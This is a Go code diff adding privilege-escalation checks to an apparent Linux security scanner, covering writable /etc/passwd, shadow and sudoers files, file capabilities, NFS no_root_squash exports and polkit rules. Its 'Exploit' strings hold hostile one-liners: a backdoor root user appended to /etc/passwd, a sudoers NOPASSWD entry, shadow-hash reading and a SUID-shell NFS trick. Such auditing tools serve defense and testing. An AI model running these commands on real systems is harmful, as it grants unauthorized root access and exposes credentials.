@@ -36,6 +36,10 @@ func init() {
 		&WritablePATHSUIDChain{},    // (#1)
 		&SessionHijackChain{},       // (#4)
 		&WritableServiceChain{},     // (#3)
+		&CriticalFilePermissionsChain{},
+		&DangerousCapabilitiesChain{},
+		&NfsNoRootSquashChain{},
+		&PolkitDangerousRulesChain{},
 	}
 }
 
@@ -666,4 +670,130 @@ func checkDefenseMechanisms(targetPath string) bool {
 	}
 
 	return false
+}
+
+// ── CHAIN 12: Critical File Permissions ──────────────
+type CriticalFilePermissionsChain struct{}
+
+func (c *CriticalFilePermissionsChain) Evaluate(report *models.ScanReport) []ChainResult {
+	var results []ChainResult
+	for _, fp := range report.FilePermissions {
+		if !fp.IsDangerous {
+			continue
+		}
+		if fp.Path == "/etc/passwd" && (fp.IsWorldWritable || fp.IsGroupWritable) {
+			results = append(results, ChainResult{
+				Name:        "Critical system file /etc/passwd is writable",
+				RiskLevel:   "100% CONFIRMED",
+				Description: "Add a new user with root UID 0 directly into /etc/passwd.",
+				Exploit:     "echo 'backdoor::0:0:root:/root:/bin/bash' >> /etc/passwd && su backdoor",
+				TargetPath:  fp.Path,
+			})
+		} else if fp.Path == "/etc/shadow" {
+			if fp.IsWorldWritable || fp.IsGroupWritable {
+				results = append(results, ChainResult{
+					Name:        "Critical system file /etc/shadow is writable",
+					RiskLevel:   "100% CONFIRMED",
+					Description: "Change the root password hash directly inside /etc/shadow.",
+					Exploit:     "Replace root hash with a known hash → su root",
+					TargetPath:  fp.Path,
+				})
+			} else if fp.IsWorldReadable || fp.Permissions == "readable" {
+				results = append(results, ChainResult{
+					Name:        "Critical sensitive file /etc/shadow is readable",
+					RiskLevel:   "100% CONFIRMED",
+					Description: "Read root and other system user hashes offline to crack them.",
+					Exploit:     "cat /etc/shadow | grep root",
+					TargetPath:  fp.Path,
+				})
+			}
+		} else if fp.Path == "/etc/sudoers" && (fp.IsWorldWritable || fp.IsGroupWritable) {
+			results = append(results, ChainResult{
+				Name:        "Critical system file /etc/sudoers is writable",
+				RiskLevel:   "100% CONFIRMED",
+				Description: "Insert NOPASSWD privileges for current user into sudoers config.",
+				Exploit:     fmt.Sprintf("echo '%s ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers && sudo -i", report.TargetUser),
+				TargetPath:  fp.Path,
+			})
+		} else if strings.HasPrefix(fp.Path, "/etc/sudoers.d/") && (fp.IsWorldWritable || fp.IsGroupWritable) {
+			results = append(results, ChainResult{
+				Name:        fmt.Sprintf("Sudoers drop-in file '%s' is writable", fp.Path),
+				RiskLevel:   "100% CONFIRMED",
+				Description: "Insert NOPASSWD privileges for current user into the drop-in file.",
+				Exploit:     fmt.Sprintf("echo '%s ALL=(ALL) NOPASSWD: ALL' >> %s && sudo -i", report.TargetUser, fp.Path),
+				TargetPath:  fp.Path,
+			})
+		}
+	}
+	return results
+}
+
+// ── CHAIN 13: Dangerous Capabilities ──────────────
+type DangerousCapabilitiesChain struct{}
+
+func (c *DangerousCapabilitiesChain) Evaluate(report *models.ScanReport) []ChainResult {
+	var results []ChainResult
+	for _, capResult := range report.Capabilities {
+		if !capResult.IsDangerous {
+			continue
+		}
+		capsLower := strings.ToLower(capResult.Capabilities)
+		if strings.Contains(capsLower, "cap_setuid") || strings.Contains(capsLower, "cap_sys_admin") || strings.Contains(capsLower, "cap_dac_override") {
+			results = append(results, ChainResult{
+				Name:        fmt.Sprintf("Binary '%s' possesses dangerous capability: %s", capResult.Path, capResult.Capabilities),
+				RiskLevel:   "100% CONFIRMED",
+				Description: "Abuse the capability on the binary to gain full root capabilities.",
+				Exploit:     capResult.ExploitHint,
+				TargetPath:  capResult.Path,
+			})
+		} else if strings.Contains(capsLower, "cap_dac_read_search") {
+			results = append(results, ChainResult{
+				Name:        fmt.Sprintf("Binary '%s' possesses file read bypass capability: %s", capResult.Path, capResult.Capabilities),
+				RiskLevel:   "100% CONFIRMED",
+				Description: "Abuse capability to read sensitive files (e.g. /etc/shadow) directly.",
+				Exploit:     fmt.Sprintf("%s /etc/shadow", capResult.Path),
+				TargetPath:  capResult.Path,
+			})
+		}
+	}
+	return results
+}
+
+// ── CHAIN 14: NFS Exports no_root_squash ──────────────
+type NfsNoRootSquashChain struct{}
+
+func (c *NfsNoRootSquashChain) Evaluate(report *models.ScanReport) []ChainResult {
+	var results []ChainResult
+	for _, nfs := range report.NFSExports {
+		if nfs.IsDangerous && nfs.IsWritable && nfs.HasNoRootSquash {
+			results = append(results, ChainResult{
+				Name:        fmt.Sprintf("NFS Export '%s' is writable with no_root_squash", nfs.Path),
+				RiskLevel:   "100% CONFIRMED",
+				Description: "Mount the share from a remote client, upload a SUID root shell, and execute it locally.",
+				Exploit:     fmt.Sprintf("Mount %s remotely -> cp /bin/bash ./shell && chmod +s ./shell -> run locally", nfs.Path),
+				TargetPath:  nfs.Path,
+			})
+		}
+	}
+	return results
+}
+
+// ── CHAIN 15: Dangerous Polkit Rules ──────────────
+type PolkitDangerousRulesChain struct{}
+
+func (c *PolkitDangerousRulesChain) Evaluate(report *models.ScanReport) []ChainResult {
+	var results []ChainResult
+	for _, pk := range report.PolkitRules {
+		if !pk.IsDangerous {
+			continue
+		}
+		results = append(results, ChainResult{
+			Name:        fmt.Sprintf("Polkit JS rule in '%s' grants passwordless authorization", pk.FilePath),
+			RiskLevel:   "100% CONFIRMED",
+			Description: fmt.Sprintf("Allows any user or vulnerable group to run action '%s' without credentials.", pk.Action),
+			Exploit:     fmt.Sprintf("Trigger the action via pkexec or dbus interface: %s", pk.Action),
+			TargetPath:  pk.FilePath,
+		})
+	}
+	return results
 }
